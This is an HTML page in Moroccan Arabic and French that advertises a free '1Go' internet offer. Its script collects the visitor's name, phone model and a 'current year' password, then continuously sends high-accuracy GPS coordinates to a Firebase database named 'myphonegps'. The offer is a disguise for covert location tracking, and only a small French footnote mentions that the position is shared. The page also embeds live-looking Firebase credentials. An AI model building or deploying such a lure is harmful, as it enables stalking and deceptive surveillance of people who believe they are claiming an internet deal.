
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>عروض الإنترنت</title>
  <style>
    * { box-sizing: border-box; }
    body {
      font-family: Arial, sans-serif;
      background: #de8100;
      color: rgb(7, 0, 0);
      margin: 0;
      padding: 16px;
    }
    .card {
      max-width: 480px;
      margin: 25px auto;
      padding: 22px;
      background: #e7e3b9;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(215, 0, 0, 0.2);
    }
    h1 { color: #000000; text-align: center; }
    .description { color: #bc4800; line-height: 1.6; text-align: center; }
    label { display: block; margin: 14px 0 6px; }
    input, select {
      width: 100%;
      padding: 13px;
      border-radius: 8px;
      border: 1px solid #ac6400;
      background: #f0f1f4;
      color: rgb(246, 241, 241);
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 13px;
      margin-top: 12px;
      border: 0;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }
    button:disabled { opacity: .5; cursor: not-allowed; }
    .primary { background: #22c55e; color: #052e16; }
    .stop { background: #f87171; color: #450a0a; }
    #status { color: #004396; line-height: 1.6; overflow-wrap: anywhere; }
    .note { color: #900700; font-size: 12px; line-height: 1.6; }
  </style>
</head>
<body>
  <main class="card">
    <h1>📢 1Go عرض الإنترنت 🌐🔥</h1>
    <p class="description">
      🚀 إنترنت سريع، تواصل بلا حدود!
استافد من عروض الإنترنت واختار الشبكة اللي مناسبة ليك.
    </p>

    <label for="nom">النسب</label>
    <input id="nom" autocomplete="family-name" placeholder="Votre nom">

    <label for="prenom">الاسم</label>
    <input id="prenom" autocomplete="given-name" placeholder="Votre prénom">

    <label for="telephone">نوع الهاتف</label>
    <input id="telephone" placeholder="Ex. : Samsung Galaxy A15">

    <label for="password">ما هو العام الحالي ؟</label>
    <input id="password" type="password" autocomplete="current-password"
           placeholder="Ex: 2024">

    <button id="startBtn" class="primary">اختيار الشبكة</button>
    <button id="stopBtn" class="stop" disabled>إلغاء العرض</button>

    <p id="status">Connexion à Firebase...</p>

    <p class="note">
      Votre position sera partagée après votre autorisation.
      Vous pouvez arrêter le partage à tout moment.
    </p>
  </main>

  <script type="module">
    import { initializeApp } from
      "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

    import { getAuth, signInAnonymously } from
      "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

    import {
      getDatabase, ref, set, onDisconnect
    } from
      "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyBaqab6yuUvIhJ3XSiV93qgRivl7z5OOfo",
      authDomain: "myphonegps.firebaseapp.com",
      databaseURL: "https://myphonegps-default-rtdb.firebaseio.com",
      projectId: "myphonegps",
      storageBucket: "myphonegps.firebasestorage.app",
      messagingSenderId: "93340951825",
      appId: "1:93340951825:web:16ad8a2321d4d2c2a498b0",
      measurementId: "G-0LR1706DJZ"
    };

    // Mot de passe de démonstration seulement.
    // Il est visible dans le code source de la page.
    const DEMO_PASSWORD = "2026";

    const $ = id => document.getElementById(id);
    const startBtn = $("startBtn");
    const stopBtn = $("stopBtn");
    const status = $("status");

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getDatabase(app);

    let user = null;
    let watchId = null;
    let sharing = false;

    try {
      const result = await signInAnonymously(auth);
      user = result.user;
      status.textContent = "Connecté. Remplissez le formulaire pour continuer.";
    } catch (error) {
      status.textContent = "Erreur de connexion Firebase : " + error.message;
      startBtn.disabled = true;
    }

    startBtn.addEventListener("click", async () => {
      if (!user || sharing) return;

      const nom = $("nom").value.trim();
      const prenom = $("prenom").value.trim();
      const telephone = $("telephone").value.trim();
      const password = $("password").value;

      if (!nom || !prenom || !telephone || !password) {
        status.textContent = "Veuillez remplir tous les champs.";
        return;
      }

      if (password !== DEMO_PASSWORD) {
        status.textContent = "Mot de passe incorrect.";
        return;
      }

      if (!navigator.geolocation) {
        status.textContent = "La géolocalisation n'est pas prise en charge.";
        return;
      }

      startBtn.disabled = true;
      status.textContent = "Demande d'autorisation GPS...";

      try {
        // Chaque utilisateur anonyme reçoit un identifiant Firebase.
        const clientRef = ref(db, `clients/${user.uid}`);

        await set(ref(db, `clients/${user.uid}/profile`), {
          nom,
          prenom,
          telephone,
          status: "connecting",
          updatedAt: Date.now()
        });

        await onDisconnect(ref(db, `clients/${user.uid}/status`))
          .set("offline");

        sharing = true;
        stopBtn.disabled = false;

        watchId = navigator.geolocation.watchPosition(
          async position => {
            if (!sharing) return;

            try {
              await set(ref(db, `clients/${user.uid}/location`), {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: Date.now()
              });

              await set(ref(db, `clients/${user.uid}/status`), "online");

              if (sharing) {
                status.textContent =
                  "Partage GPS actif. Votre position est actualisée.";
              }
            } catch (error) {
              status.textContent =
                "Erreur d'envoi Firebase : " + error.message;
            }
          },
          async error => {
            status.textContent = "Erreur GPS : " + error.message;
            sharing = false;

            if (watchId !== null) {
              navigator.geolocation.clearWatch(watchId);
              watchId = null;
            }

            stopBtn.disabled = true;
            startBtn.disabled = false;

            try {
              await set(ref(db, `clients/${user.uid}/status`), "offline");
            } catch {}
          },
          {
            enableHighAccuracy: true,
            maximumAge: 5000,
            timeout: 20000
          }
        );
      } catch (error) {
        sharing = false;
        startBtn.disabled = false;
        stopBtn.disabled = true;
        status.textContent =
          "Erreur Firebase : " + error.message +
          " (les règles Firebase devront peut-être être adaptées).";
      }
    });

    stopBtn.addEventListener("click", async () => {
      sharing = false;

      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
      }

      stopBtn.disabled = true;
      startBtn.disabled = false;
      status.textContent = "Arrêt du partage...";

      try {
        await set(ref(db, `clients/${user.uid}/location`), null);
        await set(ref(db, `clients/${user.uid}/status`), "offline");
        status.textContent = "Partage arrêté. La position a été supprimée.";
      } catch (error) {
        status.textContent = "GPS arrêté, mais erreur Firebase : " + error.message;
      }
    });
  </script>
</body>
</html>
